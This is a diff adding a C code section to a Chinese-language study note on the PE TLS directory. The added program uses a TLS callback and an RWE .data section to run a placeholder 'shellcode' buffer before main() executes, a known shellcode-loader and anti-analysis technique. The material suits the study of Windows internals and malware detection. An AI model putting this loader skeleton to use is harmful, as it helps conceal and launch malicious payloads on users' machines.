@@ -37,3 +37,45 @@ typedef struct _IMAGE_TLS_DIRECTORY32 {   //SIZE:0x18h
 typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;
 ```
 
+## 代码实现
+
+```text
+#include <Windows.h>
+#include <stdio.h>
+#pragma comment(linker, "/section:.data,RWE") 
+
+unsigned char buf[] ="shellcode";
+
+
+VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved) 
+//DllHandle模块句柄、Reason调用原因、 Reserved加载方式（显式/隐式）
+{
+	if (dwReason == DLL_PROCESS_ATTACH)
+	{
+		((void(WINAPI*)(void)) & buf)();
+	}
+
+}
+//使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用
+#pragma comment (linker, "/INCLUDE:__tls_used")
+#pragma comment (linker, "/INCLUDE:__tls_callback")
+
+
+
+#pragma data_seg (".CRT$XLB")
+//.CRT表明是使用C RunTime机制，$后面的XLB中：X表示随机的标识
+//L表示是TLS callback section，B可以被换成B到Y之间的任意一个字母，
+//但是不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。
+EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;
+#pragma data_seg ()
+
+
+
+
+int main()
+{
+	printf("ok");
+	return 0;
+}
+```
+
